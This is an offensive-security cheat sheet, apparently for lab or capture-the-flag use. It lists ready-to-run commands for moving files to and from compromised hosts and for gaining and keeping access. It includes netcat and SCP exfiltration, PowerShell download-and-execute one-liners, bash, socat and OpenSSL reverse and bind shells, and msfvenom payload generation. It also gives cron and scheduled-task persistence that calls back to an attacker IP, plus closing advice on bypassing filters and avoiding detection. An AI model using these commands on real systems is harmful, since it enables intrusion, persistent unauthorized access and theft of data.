# File Transfer Techniques

## Upload file to target using netcat

```bash
nc -w 3 $IP 4444 < file.exe
```

## Receive file on target using netcat

```bash
nc -nlvp 4444 > file.exe
```

## Download file from target using netcat

```bash
nc -nlvp 4444 > sensitive_file.txt
```

## Send file from target using netcat

```bash
nc -w 3 10.10.14.5 4444 < sensitive_file.txt
```

## Verify transferred file integrity with md5sum

```bash
md5sum file.exe
ls -la file.exe
```

## Encode small file to base64 for transfer

```bash
base64 -w 0 file.exe
```

## Decode base64 content to file

```bash
echo "BASE64_CONTENT_HERE" | base64 -d > file.exe
```

## Split and encode large file into chunks

```bash
split -b 50000 file.exe chunk_
for chunk in chunk_*; do base64 -w 0 $chunk > $chunk.b64; done
```

## Decode and reassemble chunked file

```bash
echo "CHUNK1_BASE64" | base64 -d > chunk_aa
echo "CHUNK2_BASE64" | base64 -d > chunk_ab
cat chunk_* > file.exe
```

## Start SMB server with anonymous access

```bash
impacket-smbserver share . -smb2support
```

## Start SMB server with authentication

```bash
impacket-smbserver share . -smb2support -username user -password pass
```

## Access anonymous SMB share from Windows

```cmd
net use \\10.10.14.5\share
copy \\10.10.14.5\share\file.exe C:\temp\
```

## Access authenticated SMB share from Windows

```cmd
net use \\10.10.14.5\share /user:user pass
copy \\10.10.14.5\share\file.exe C:\temp\
```

## Download file using PowerShell WebClient

```powershell
IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','C:\temp\file.exe')
```

## Download file using PowerShell Invoke-WebRequest

```powershell
Invoke-WebRequest -Uri http://10.10.14.5/file.exe -OutFile C:\temp\file.exe
```

## ConPtyShell (Source)
```
https://github.com/antonioCoco/ConPtyShell
```

## Download file using PowerShell one-liner

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','file.exe')"
```

## Download file using Windows certutil

```cmd
certutil -urlcache -split -f http://10.10.14.5/file.exe file.exe
```

## Delete certutil cache after download

```cmd
certutil -urlcache -split -f http://10.10.14.5/file.exe delete
```

## Download file using wget on Linux

```bash
wget http://10.10.14.5/file -O file
```

## Download file using curl on Linux

```bash
curl http://10.10.14.5/file -o file
```

## Download file using curl with custom user agent

```bash
curl -A "Mozilla/5.0" http://10.10.14.5/file -o file
```

## Start Python HTTP server on alternate port

```bash
python3 -m http.server 8080
python3 -m http.server 9000
python3 -m http.server 443
```

## Start Python HTTP server on specific interface

```bash
python3 -m http.server 8080 --bind 10.10.14.5
```

## Generate self-signed certificate for HTTPS server

```bash
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

## Start Python HTTPS server

```python
python3 -c "import http.server, ssl, socketserver; httpd = socketserver.TCPServer(('', 443), http.server.SimpleHTTPRequestHandler); httpd.socket = ssl.wrap_socket(httpd.socket, certfile='server.pem', server_side=True); httpd.serve_forever()"
```

## Start Python FTP server

```bash
python3 -m pyftpdlib -p 21 -w
```

## Download from FTP server

```bash
wget ftp://10.10.14.5/file.exe
```

## Upload file to target using SCP

```bash
scp file.exe user@$IP:/tmp/
```

## Download file from target using SCP

```bash
scp user@$IP:/tmp/sensitive_file.txt .
```

## Upload file using SCP on custom port

```bash
scp -P 2222 file.exe user@$IP:/tmp/
```

## Verify file hash on Linux

```bash
md5sum file.exe
sha256sum file.exe
```

## Verify file hash on Windows

```cmd
certutil -hashfile file.exe MD5
certutil -hashfile file.exe SHA256
```

## Check file type on Linux

```bash
file file.exe
```

## Powershell download with Start-BitsTransfer
```
powershell -c "Start-BitsTransfer -Source 'http://10.10.14.5/file.exe' -Destination 'C:\Temp'"
```

## PowerShell download with IWR

```powershell
powershell -c "iwr http://10.10.14.5/file.exe -o file.exe"
```

## Certutil download on Windows

```cmd
certutil -urlcache -f http://10.10.14.5/file.exe file.exe
```


## Transfer file using base64 over netcat

```bash
base64 -w 0 file | nc $IP 4444
```

## Establish bash reverse shell to attacker

```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

## Establish bash reverse shell using named pipe

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

## Establish bash reverse shell using file descriptor

```bash
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196
```

## Establish busybox reverse shell

```bash
busybox nc 10.10.14.5 4444 -e sh
```

## Download and execute Nishang PowerShell reverse shell

```powershell
powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444"
```

## Execute base64 encoded PowerShell command

```powershell
powershell -EncodedCommand BASE64_ENCODED_COMMAND_HERE
```

## Download and execute PowerShell script using IWR

```powershell
powershell -c "IWR -UseBasicParsing http://10.10.14.5/shell.ps1|IEX"
```

## Create Linux bind shell with netcat

```bash
nc -nlvp 4444 -e /bin/bash
```

## Create Linux bind shell without netcat -e flag

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash 2>&1 | nc -nlvp 4444 > /tmp/f
```

## Connect to bind shell on target

```bash
nc $IP 4444
```

## Create Linux ELF reverse shell with msfvenom

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > shell.elf
```

## Create Linux ELF bind shell with msfvenom

```bash
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf > bind.elf
```

## Create Linux meterpreter with msfvenom

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > met.elf
```

## Create Windows reverse shell with msfvenom

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > shell.exe
```

## Create Windows meterpreter with msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > met.exe
```

## Create Windows bind shell with msfvenom

```bash
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe > bind.exe
```

## Create PowerShell reverse shell with msfvenom

```bash
msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shell.ps1
```



## Add reverse shell to crontab for persistence

```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" | crontab -
```

## Add system-wide cron job for persistence

```bash
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" >> /etc/crontab
```

## Create Windows scheduled task for persistence

```cmd
schtasks /create /tn "SystemUpdate" /tr "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')" /sc minute /mo 5
```

## Create socat reverse shell on Linux

```bash
socat TCP:10.10.14.5:4444 EXEC:/bin/bash
```

## Create socat bind shell on Linux

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

## Generate certificate for encrypted socat shell

```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
```

## Create encrypted socat listener

```bash
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork EXEC:/bin/bash
```

## Generate SSL certificate for OpenSSL shell

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

## Start OpenSSL listener for reverse shell

```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

## Connect to OpenSSL listener from target

```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```

## Start netcat listener for reverse shell

```bash
nc -nlvp 4444
```

## Start netcat listener with logging

```bash
nc -nlvp 4444 | tee shell.log
```

## Start persistent netcat listener

```bash
while true; do nc -nlvp 4444; done
```

## Start Metasploit multi handler for reverse shell

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; exploit -j"
```

## Start socat listener for reverse shell

```bash
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

## Set terminal environment variable

```bash
export TERM=xterm
```

## Set terminal size for proper display

```bash
stty rows 38 columns 116
```

## Compress file before transfer

```bash
gzip file.exe
```

## List files with detailed information on Linux

```bash
ls -la file.exe
```

## List files with detailed information on Windows

```cmd
dir file.exe
```

---

## Alternative Transfer Methods

When standard HTTP servers are blocked or unreliable, these alternative file transfer methods can bypass restrictions and maintain access to target systems.

## Method Selection Guide

### Netcat Transfer
- Most reliable when direct network access exists
- Works on nearly all systems
- No dependencies required
- Best for binary files

### Base64 Encoding
- Bypasses content filtering firewalls
- Works through restrictive shells
- Good for small to medium files
- Requires manual copy/paste for large files

### SMB Shares
- Native Windows integration
- Fast transfer speeds
- May require authentication
- Can bypass web filtering

### Native OS Tools
- Already present on target systems
- No file upload required
- May be logged/monitored
- PowerShell often available on Windows

### SSH/SCP
- Encrypted transfer
- Requires credentials
- Standard on Linux systems
- Reliable and fast

### Tunneling Methods
- Access isolated networks
- Bypass network restrictions
- Requires pivot point
- More complex setup

## File Transfer Best Practices

1. Always verify file integrity after transfer using hashes
2. Use multiple methods if first attempt fails
3. Consider file size when choosing transfer method
4. Test connectivity to different ports before transfer
5. Use reverse connections when firewall rules block incoming
6. Encode binary files when transferring through shells
7. Keep tools organized and ready on attacker machine

## Troubleshooting Transfer Issues

### HTTP Server Blocked
Try different ports (8080, 9000, 443), use HTTPS instead of HTTP, switch to SMB or base64 methods

### File Corruption
Compare file sizes and MD5 hashes before/after transfer, ensure binary mode transfers, avoid shell interpretation using base64

### Large File Transfers
Chunk files into smaller pieces, use compression with gzip, stream directly with netcat, consider multiple parallel transfers

### Network Restrictions
Test connectivity to different ports, use reverse connections, try UDP instead of TCP, encode traffic to avoid detection

## Shell Integration

Once file transfer is established, follow this workflow:
1. Establish initial shell access
2. Upgrade shell for better interaction
3. Transfer enumeration and exploitation tools
4. Execute tools and exfiltrate results
5. Backup important findings before making system changes

## Common Tools to Transfer

- LinPEAS / WinPEAS for enumeration
- Privilege escalation exploits
- Additional payload binaries
- Post-exploitation frameworks
- Network tunneling tools
